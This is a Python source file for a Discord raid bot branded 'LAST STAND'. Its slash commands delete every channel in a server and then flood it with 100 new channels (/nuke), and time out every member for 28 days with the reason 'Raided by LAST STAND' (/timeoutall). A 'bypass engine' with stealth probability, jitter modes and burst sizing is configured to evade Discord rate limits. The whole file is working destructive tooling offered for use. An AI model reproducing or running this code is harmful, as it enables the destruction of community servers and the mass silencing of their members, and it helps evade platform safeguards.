"""
control.py — LAST STAND | /stop, /setratelimit, /status, /nuke, /timeoutall, /bypassstats
"""

import asyncio
import datetime
import random

import discord
from discord import app_commands
from discord.ext import commands

from utils.bypass import (
    ROUTE_CHANNEL_DELETE, ROUTE_CHANNEL_CREATE,
    ROUTE_MEMBER_KICK, ROUTE_MEMBER_TIMEOUT,
    JITTER_ZERO, JITTER_GAUSSIAN, JITTER_EXPONENTIAL, JITTER_POISSON,
)
from utils.state import bot_state

RAID_TAG   = "LAST STAND"
RAID_SHORT = "LSC"


class Control(commands.Cog):
    def __init__(self, bot: commands.Bot) -> None:
        self.bot = bot

    # ── /stop ──────────────────────────────────────────────────────────────────
    @app_commands.command(name="stop", description="Immediately stop all running operations.")
    @app_commands.checks.has_permissions(administrator=True)
    @app_commands.guild_only()
    async def stop(self, interaction: discord.Interaction) -> None:
        if not bot_state.active_simulation and not bot_state.is_running():
            await interaction.response.send_message("No operation is currently running.", ephemeral=True)
            return

        simulation = bot_state.active_simulation or "unknown"
        count      = len(bot_state.running_tasks)
        stats      = bot_state.bypass.stats_str()
        bot_state.stop_all()

        await interaction.response.send_message(
            f"🛑 **Stopped — {RAID_TAG}**\n"
            f"┣ Operation : `{simulation}`\n"
            f"┣ Cancelled : `{count}` tasks\n"
            f"┗ Bypass    : `{stats}`",
        )

    # ── /setratelimit ──────────────────────────────────────────────────────────
    @app_commands.command(name="setratelimit", description="Change attack intensity live (1–10).")
    @app_commands.describe(level="1 = slowest / most stealthy, 10 = zero-delay maximum.")
    @app_commands.checks.has_permissions(administrator=True)
    @app_commands.guild_only()
    async def setratelimit(self, interaction: discord.Interaction, level: int) -> None:
        if not 1 <= level <= 10:
            await interaction.response.send_message("❌ Level must be 1–10.", ephemeral=True)
            return

        bot_state.rate_controller.set_intensity(level)
        bot_state.bypass.configure(level)
        ctx = "(live)" if bot_state.active_simulation else "(next op)"

        jitter_label = {
            JITTER_ZERO: "zero (max speed)",
            JITTER_GAUSSIAN: "gaussian (human-like)",
            JITTER_EXPONENTIAL: "exponential (organic bursts)",
            JITTER_POISSON: "poisson (arrival-rate)",
        }.get(bot_state.bypass.jitter_mode, bot_state.bypass.jitter_mode)

        await interaction.response.send_message(
            f"⚙️ **Intensity updated** {ctx}\n"
            f"┣ {bot_state.rate_controller.describe()}\n"
            f"┣ Jitter mode    : `{jitter_label}`\n"
            f"┣ Stealth prob   : `{bot_state.bypass.stealth_prob * 100:.0f}%`\n"
            f"┗ Burst size     : `{bot_state.bypass.burst_size}`",
            ephemeral=True,
        )

    # ── /status ────────────────────────────────────────────────────────────────
    @app_commands.command(name="status", description="Show current operation + bypass status.")
    @app_commands.checks.has_permissions(administrator=True)
    @app_commands.guild_only()
    async def status(self, interaction: discord.Interaction) -> None:
        rc    = bot_state.rate_controller
        bp    = bot_state.bypass
        stats = bp.stats_str()

        jitter_label = {
            JITTER_ZERO: "zero",
            JITTER_GAUSSIAN: "gaussian",
            JITTER_EXPONENTIAL: "exponential",
            JITTER_POISSON: "poisson",
        }.get(bp.jitter_mode, bp.jitter_mode)

        if bot_state.active_simulation:
            msg = (
                f"📊 **Running: `{bot_state.active_simulation}`** — {RAID_TAG}\n"
                f"┣ {rc.describe()}\n"
                f"┣ Active tasks    : `{len(bot_state.running_tasks)}`\n"
                f"┣ Jitter mode     : `{jitter_label}`\n"
                f"┣ Stealth prob    : `{bp.stealth_prob * 100:.0f}%`\n"
                f"┣ Burst size      : `{bp.burst_size}`\n"
                f"┗ Bypass stats    : `{stats}`"
            )
        else:
            msg = (
                f"📊 **Idle** — {RAID_TAG}\n"
                f"┣ {rc.describe()}\n"
                f"┣ Jitter mode     : `{jitter_label}`\n"
                f"┣ Stealth prob    : `{bp.stealth_prob * 100:.0f}%`\n"
                f"┗ Bypass stats    : `{stats}`"
            )
        await interaction.response.send_message(msg, ephemeral=True)

    # ── /bypassstats ───────────────────────────────────────────────────────────
    @app_commands.command(
        name="bypassstats",
        description="Show detailed bypass engine statistics from the last operation.",
    )
    @app_commands.checks.has_permissions(administrator=True)
    @app_commands.guild_only()
    async def bypassstats(self, interaction: discord.Interaction) -> None:
        bp = bot_state.bypass
        sr = (bp.successes / max(bp.calls, 1)) * 100
        await interaction.response.send_message(
            f"🔬 **Bypass Engine Stats — {RAID_TAG}**\n"
            f"```\n"
            f"Total API calls   : {bp.calls}\n"
            f"Successes         : {bp.successes}\n"
            f"Failures          : {bp.failures}\n"
            f"Rate limits hit   : {bp.rate_limits}\n"
            f"Retries issued    : {bp.retries}\n"
            f"Success rate      : {sr:.1f}%\n"
            f"Jitter mode       : {bp.jitter_mode}\n"
            f"Stealth prob      : {bp.stealth_prob * 100:.0f}%\n"
            f"Burst size        : {bp.burst_size}\n"
            f"```",
            ephemeral=True,
        )

    # ── /nuke ──────────────────────────────────────────────────────────────────
    @app_commands.command(
        name="nuke",
        description="☢️ Delete every channel and category instantly.",
    )
    @app_commands.describe(rebuild="After nuking, create 100 flood channels. Default True.")
    @app_commands.checks.has_permissions(administrator=True)
    @app_commands.guild_only()
    async def nuke(self, interaction: discord.Interaction, rebuild: bool = True) -> None:
        if bot_state.active_simulation:
            await interaction.response.send_message(
                f"⚠️ **{bot_state.active_simulation}** running. Use `/stop` first.",
                ephemeral=True,
            )
            return

        guild = interaction.guild
        assert guild is not None

        bot_state.reset()
        bot_state.rate_controller.set_intensity(10)
        bot_state.bypass.configure(10)
        bot_state.active_simulation = "nuke"

        channels = list(guild.channels)
        await interaction.response.send_message(
            f"☢️ **NUKE — {RAID_TAG}**\n"
            f"┣ Deleting : `{len(channels)}` channels\n"
            f"┣ Rebuild  : `{'✅ 100 flood channels' if rebuild else '❌'}`\n"
            f"┗ `/stop` cancels.",
        )

        task = asyncio.create_task(self._run_nuke(guild, channels, rebuild))
        bot_state.add_task(task)

    async def _run_nuke(self, guild: discord.Guild, channels: list, rebuild: bool) -> None:
        bp = bot_state.bypass
        se = bot_state.stop_event
        sem = asyncio.Semaphore(50)
        try:
            await asyncio.gather(
                *[bp.execute(ROUTE_CHANNEL_DELETE, lambda c=ch: c.delete(), se)
                  for ch in channels],
                return_exceptions=True,
            )
            if rebuild and not se.is_set():
                sem_c = asyncio.Semaphore(40)
                await asyncio.gather(
                    *[self._create_flood_ch(guild, i, sem_c) for i in range(100)],
                    return_exceptions=True,
                )
        except asyncio.CancelledError:
            pass
        finally:
            if bot_state.active_simulation == "nuke":
                bot_state.active_simulation = None

    async def _create_flood_ch(self, guild: discord.Guild, idx: int, sem: asyncio.Semaphore) -> None:
        async with sem:
            name = bot_state.bypass.fp.channel_name("flood", idx)
            await bot_state.bypass.execute(
                ROUTE_CHANNEL_CREATE,
                lambda n=name: guild.create_text_channel(n),
                bot_state.stop_event,
            )

    # ── /timeoutall ────────────────────────────────────────────────────────────
    @app_commands.command(
        name="timeoutall",
        description="⏱️ Timeout every member for 28 days simultaneously.",
    )
    @app_commands.describe(skip_admins="Skip admins. Default False.")
    @app_commands.checks.has_permissions(administrator=True)
    @app_commands.guild_only()
    async def timeoutall(self, interaction: discord.Interaction, skip_admins: bool = False) -> None:
        if bot_state.active_simulation:
            await interaction.response.send_message(
                f"⚠️ **{bot_state.active_simulation}** running. Use `/stop` first.",
                ephemeral=True,
            )
            return

        guild = interaction.guild
        assert guild is not None

        targets = [
            m for m in guild.members
            if not m.bot
            and m.id != interaction.user.id
            and (not skip_admins or not m.guild_permissions.administrator)
        ]

        if not targets:
            await interaction.response.send_message("No eligible members found.", ephemeral=True)
            return

        bot_state.reset()
        bot_state.rate_controller.set_intensity(10)
        bot_state.bypass.configure(10)
        bot_state.active_simulation = "timeoutall"

        await interaction.response.send_message(
            f"⏱️ **MASS TIMEOUT — {RAID_TAG}**\n"
            f"┣ Targets  : `{len(targets)}`\n"
            f"┣ Duration : `28 days`\n"
            f"┗ `/stop` halts immediately.",
        )

        task = asyncio.create_task(self._run_timeout(targets))
        bot_state.add_task(task)

    async def _run_timeout(self, members: list[discord.Member]) -> None:
        bp  = bot_state.bypass
        se  = bot_state.stop_event
        sem = asyncio.Semaphore(40)
        dur = datetime.timedelta(days=28)
        try:
            await asyncio.gather(
                *[self._timeout_one(m, dur, sem) for m in members],
                return_exceptions=True,
            )
        except asyncio.CancelledError:
            pass
        finally:
            if bot_state.active_simulation == "timeoutall":
                bot_state.active_simulation = None

    async def _timeout_one(
        self, m: discord.Member, dur: datetime.timedelta, sem: asyncio.Semaphore
    ) -> None:
        async with sem:
            await bot_state.bypass.execute(
                ROUTE_MEMBER_TIMEOUT,
                lambda: m.timeout(dur, reason=f"Raided by {RAID_TAG}"),
                bot_state.stop_event,
            )

    # ── Error handlers ─────────────────────────────────────────────────────────
    @stop.error
    @setratelimit.error
    @status.error
    @bypassstats.error
    @nuke.error
    @timeoutall.error
    async def _cmd_error(
        self, interaction: discord.Interaction, error: app_commands.AppCommandError
    ) -> None:
        msg = "❌ You need **Administrator** permission." if isinstance(error, app_commands.MissingPermissions) else f"❌ {error}"
        try:
            if interaction.response.is_done():
                await interaction.followup.send(msg, ephemeral=True)
            else:
                await interaction.response.send_message(msg, ephemeral=True)
        except Exception:
            pass


async def setup(bot: commands.Bot) -> None:
    await bot.add_cog(Control(bot))
